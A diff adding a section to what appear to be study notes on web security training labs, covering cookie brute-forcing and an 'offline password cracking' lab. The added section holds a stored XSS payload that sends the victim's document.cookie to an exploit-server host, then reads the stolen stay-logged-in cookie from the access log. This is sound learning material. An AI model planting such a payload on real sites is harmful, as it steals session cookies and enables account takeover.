@@ -155,6 +155,19 @@ Under Payload processing, add the following rules in order.
 - Encode: Base64-encode
 
 As the Update email button is only displayed when you access the My account page in an authenticated state, we can use the presence or absence of this button to determine whether we've successfully brute-forced the cookie. In the  Settings side panel, add a `grep match` rule to flag any responses containing the string `Update email`
+##### *Lab - offline passwrd cracking*
+
+-we have a `stay-logged-in` cookie crafted the same as the above lab
+- here we have a comment functionality and an exploit server , observe that the comment functionality is vulnerable to XSS.
+Go to one of the blogs and post a comment containing the following stored XSS payload,
+```js
+<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
+```
+
+On the exploit server, open the access log. There should be a GET request from the victim containing their stay-logged-in cookie.
+-  since the cookie is crafted the same as before, decode it accordingly.
+  
+
 
 ### References 
 
